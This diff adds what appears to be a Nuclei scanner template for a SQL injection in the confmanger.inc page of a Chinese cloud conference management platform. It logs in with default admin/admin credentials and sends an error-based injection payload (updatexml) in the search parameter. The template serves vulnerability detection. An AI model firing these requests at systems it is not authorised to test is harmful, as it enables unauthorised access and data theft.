@@ -1,0 +1,62 @@
+id: hwactive-confmanger-inc-sqli
+info:
+  name: 华望云会议管理平台 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, chinese
+  description: |
+    华望云会议管理平台的 `confmanger.inc` 页面存在 SQL 注入漏洞。攻击者通过特定的 payload 参数，可以注入恶意 SQL 查询，可能导致敏感数据泄露。
+
+variables:
+  uid: ""
+  cookie: ""
+
+flow: http(1) && http(2)
+
+http:
+  - id: "login-request"
+    method: POST
+    path:
+      - "/ajax/userlogin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+    extractors:
+      - type: regex
+        internal: true
+        name: uid
+        part: header
+        regex:
+          - "uid=(.*?);"
+      - type: regex
+        internal: true
+        name: cookie
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+
+  - id: "sqli-detection"
+    method: GET
+    path:
+      - "/page/confmanger.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&params[]=displayName"
+    headers:
+      Cookie: uid={{uid}}; JSESSIONID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "c4ca4238a0b923820dcc509a6f75849b"
